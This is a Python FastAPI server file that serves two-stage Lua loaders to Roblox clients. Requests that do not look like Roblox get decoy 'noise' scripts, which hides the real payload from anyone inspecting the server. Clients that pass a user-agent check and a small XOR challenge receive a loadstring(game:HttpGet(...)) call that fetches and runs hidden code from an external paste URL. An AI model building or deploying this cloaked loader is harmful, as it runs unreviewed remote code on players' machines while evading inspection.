from fastapi import FastAPI, Request
from fastapi.responses import PlainTextResponse
import time, secrets, random

app = FastAPI()

# =========================
# STATE
# =========================
sessions = {}
ip_attempts = {}

# =========================
# HELPERS
# =========================
def now_ms():
    return int(time.time() * 1000)

def rate_limit(ip: str) -> bool:
    now = now_ms()
    arr = ip_attempts.get(ip, [])
    recent = [t for t in arr if now - t < 60000]

    if len(recent) > 10:
        return True

    recent.append(now)
    ip_attempts[ip] = recent[-20:]
    return False

def noise_lua() -> str:
    pool = [
        "local x=0 for i=1,5 do x=x+i end",
        "task.wait(math.random())",
        "local t=os.clock() while os.clock()-t<0.01 do end"
    ]
    return random.choice(pool)

def bit32_xor(a: int, b: int) -> int:
    return (a ^ b) & 0xffffffff

# =========================
# ROUTES
# =========================
@app.get("/")
async def entry(req: Request):
    ua = req.headers.get("user-agent", "")
    ip = (
        req.headers.get("x-forwarded-for")
        or req.client.host
        or "x"
    )

    if rate_limit(ip):
        return PlainTextResponse(noise_lua(), status_code=200)

    if "Roblox" not in ua or len(ua) < 8:
        return PlainTextResponse(noise_lua(), status_code=200)

    sid = secrets.token_hex(16)
    ts = int(time.time() * 1000) & 0xFFFF
    salt = random.randint(0, 0xFFFF)

    sessions[sid] = {
        "ip": ip,
        "ts": ts,
        "salt": salt,
        "used": False,
        "time": time.time()
    }

    lua = f'''
local o="{req.url.scheme}://{req.url.netloc}"
local s="{sid}"
local t={ts}
local r={salt}

task.wait(math.random(6,12)/100)

local function solve()
    local x = bit32.bxor(t, r)
    x = (x + ((t * 31) % 65536)) % 65536
    return x
end

loadstring(game:HttpGet(o.."/s/"..s.."?p="..solve()))()
'''

    return PlainTextResponse(lua, status_code=200)


@app.get("/s/{sid}")
async def stage2(sid: str, req: Request, p: int = 0):
    ip = (
        req.headers.get("x-forwarded-for")
        or req.client.host
        or "x"
    )

    session = sessions.get(sid)
    if not session:
        return PlainTextResponse(noise_lua(), status_code=200)

    if session["used"]:
        return PlainTextResponse(noise_lua(), status_code=200)

    if session["ip"] != ip:
        return PlainTextResponse(noise_lua(), status_code=200)

    expected = (
        bit32_xor(session["ts"], session["salt"]) +
        ((session["ts"] * 31) % 65536)
    ) % 65536

    session["used"] = True
    sessions.pop(sid, None)

    if p != expected:
        return PlainTextResponse(noise_lua(), status_code=200)

    return PlainTextResponse(
        'loadstring(game:HttpGet("https://pastefy.app/tAzMSwbW/raw"))()',
        status_code=200
    )
